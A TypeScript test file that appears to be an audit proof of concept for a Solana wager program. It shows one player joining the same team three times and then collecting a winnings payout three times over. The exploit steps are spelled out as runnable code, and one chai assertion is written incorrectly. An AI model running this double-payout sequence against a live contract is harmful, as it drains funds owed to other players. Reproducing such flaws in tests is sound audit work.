import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { WagerProgram } from "../target/types/wager_program";
import { PublicKey, Keypair, SystemProgram } from "@solana/web3.js";
import { createMint, createAssociatedTokenAccount, mintTo } from "@solana/spl-token";
import { expect } from "chai";
import { TOKEN_ID } from "../target/types/wager_program";

const TOKEN_PROGRAM_ID = anchor.utils.token.TOKEN_PROGRAM_ID;
const ASSOCIATED_TOKEN_PROGRAM_ID = anchor.utils.token.ASSOCIATED_PROGRAM_ID;

describe("F2: Duplicate Player Joins", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = anchor.workspace.WagerProgram as Program<WagerProgram>;
  const gameServer = Keypair.generate();
  const playerA = Keypair.generate(); // Duplicate player for team A
  const playerB1 = Keypair.generate();
  const playerB2 = Keypair.generate();
  const playerB3 = Keypair.generate(); // Team B players
  let mint: PublicKey;
  let playerAToken: PublicKey;
  let playerB1Token: PublicKey;
  let playerB2Token: PublicKey;
  let playerB3Token: PublicKey;
  let vaultToken: PublicKey;
  let sessionId = "test_duplicates";
  let gameSessionPda: PublicKey;
  let vaultPda: PublicKey;

  before(async () => {
    // Fund keypairs
    await provider.connection.confirmTransaction(await provider.connection.requestAirdrop(gameServer.publicKey, 1e9));
    await provider.connection.confirmTransaction(await provider.connection.requestAirdrop(playerA.publicKey, 1e9));
    await provider.connection.confirmTransaction(await provider.connection.requestAirdrop(playerB1.publicKey, 1e9));
    await provider.connection.confirmTransaction(await provider.connection.requestAirdrop(playerB2.publicKey, 1e9));
    await provider.connection.confirmTransaction(await provider.connection.requestAirdrop(playerB3.publicKey, 1e9));

    // Use fixed mint
    // mint = TOKEN_ID;
    mint = await createMint(provider.connection, provider.wallet.payer, provider.wallet.publicKey, null, 9);
    playerAToken = await createAssociatedTokenAccount(provider.connection, provider.wallet.payer, mint, playerA.publicKey);
    playerB1Token = await createAssociatedTokenAccount(provider.connection, provider.wallet.payer, mint, playerB1.publicKey);
    playerB2Token = await createAssociatedTokenAccount(provider.connection, provider.wallet.payer, mint, playerB2.publicKey);
    playerB3Token = await createAssociatedTokenAccount(provider.connection, provider.wallet.payer, mint, playerB3.publicKey);
    
    await mintTo(provider.connection, provider.wallet.payer, mint, playerAToken, provider.wallet.publicKey, 3000000); // Enough for 3 bets
    await mintTo(provider.connection, provider.wallet.payer, mint, playerB1Token, provider.wallet.publicKey, 1000);
    await mintTo(provider.connection, provider.wallet.payer, mint, playerB2Token, provider.wallet.publicKey, 1000);
    await mintTo(provider.connection, provider.wallet.payer, mint, playerB3Token, provider.wallet.publicKey, 1000);
    
    [gameSessionPda] = await PublicKey.findProgramAddress([Buffer.from("game_session"), Buffer.from(sessionId)], program.programId);
    [vaultPda] = await PublicKey.findProgramAddress([Buffer.from("vault"), Buffer.from(sessionId)], program.programId);
    vaultToken = await createAssociatedTokenAccount(
      provider.connection,
      provider.wallet.payer,
      mint,
      vaultPda,
      false,  // confirm
      undefined,
      undefined,
      true    // allowOwnerOffCurve
    );
  });

  it("Reproduces duplicate joins and unfair winnings", async () => {
    // Expectation: Create 3v3 session
    await program.methods.createGameSession(sessionId, new anchor.BN(1000), { winnerTakesAllThreeVsThree: {} })
      .accounts({
        gameServer: gameServer.publicKey,
        gameSession: gameSessionPda,
        vault: vaultPda,
        vaultTokenAccount: vaultToken,
        mint: mint,
        tokenProgram: TOKEN_PROGRAM_ID,
        associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
        rent: anchor.web3.SYSVAR_RENT_PUBKEY,
      })
      .signers([gameServer])
      .rpc();

    // Join same playerA 3 times to team 0
    for (let i = 0; i < 3; i++) {
      await program.methods.joinUser(sessionId, 0)
        .accounts({
          user: playerA.publicKey,
          gameServer: gameServer.publicKey,
          gameSession: gameSessionPda,
          userTokenAccount: playerAToken,
          vault: vaultPda,
          vaultTokenAccount: vaultToken,
          mint: mint,
          tokenProgram: TOKEN_PROGRAM_ID,
          associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
          systemProgram: SystemProgram.programId,
        })
        .signers([playerA])
        .rpc();
    }

    // Join 3 different players to team 1
    await program.methods.joinUser(sessionId, 1)
      .accounts({
        user: playerB1.publicKey,
        gameServer: gameServer.publicKey,
        gameSession: gameSessionPda,
        userTokenAccount: playerB1Token,
        vault: vaultPda,
        vaultTokenAccount: vaultToken,
        mint: mint,
        tokenProgram: TOKEN_PROGRAM_ID,
        associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
      })
      .signers([playerB1])
      .rpc();

    await program.methods.joinUser(sessionId, 1)
      .accounts({
        user: playerB2.publicKey,
        gameServer: gameServer.publicKey,
        gameSession: gameSessionPda,
        userTokenAccount: playerB2Token,
        vault: vaultPda,
        vaultTokenAccount: vaultToken,
        mint: mint,
        tokenProgram: TOKEN_PROGRAM_ID,
        associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
      })
      .signers([playerB2])
      .rpc();

    await program.methods.joinUser(sessionId, 1)
      .accounts({
        user: playerB3.publicKey,
        gameServer: gameServer.publicKey,
        gameSession: gameSessionPda,
        userTokenAccount: playerB3Token,
        vault: vaultPda,
        vaultTokenAccount: vaultToken,
        mint: mint,
        tokenProgram: TOKEN_PROGRAM_ID,
        associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
      })
      .signers([playerB3])
      .rpc();

    // Fetch and assert duplicates
    const gameSession = await program.account.gameSession.fetch(gameSessionPda);
    const teamPlayers = gameSession.teamA.players.slice(0, 3); // First 3 slots
    expect(teamPlayers.every(p => p.equals(playerA.publicKey))).to.be.true("All slots should be the same player"); // Assertion: Duplicates

    // Simulate game end and distribute (assume team 0 wins) - player gets 3x winnings
    const preBalance = await provider.connection.getTokenAccountBalance(playerAToken);
    const remainingAccounts = [];
    for (let i = 0; i < 3; i++) {
      remainingAccounts.push(
        { pubkey: playerA.publicKey, isWritable: false, isSigner: false },
        { pubkey: playerAToken, isWritable: true, isSigner: false }
      );
    }
    await program.methods.distributeWinnings(sessionId, 0)
      .accounts({
        gameServer: gameServer.publicKey,
        gameSession: gameSessionPda,
        vault: vaultPda,
        vaultTokenAccount: vaultToken,
        tokenProgram: TOKEN_PROGRAM_ID,
        associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
      })
      .remainingAccounts(remainingAccounts)
      .signers([gameServer])
      .rpc();

    const postBalance = await provider.connection.getTokenAccountBalance(playerAToken);
    expect(Number(postBalance.value.amount) - Number(preBalance.value.amount)).to.be.greaterThan(2000, "Player receives multi-winnings due to duplicates"); // Assertion: Unfair payout
  });
});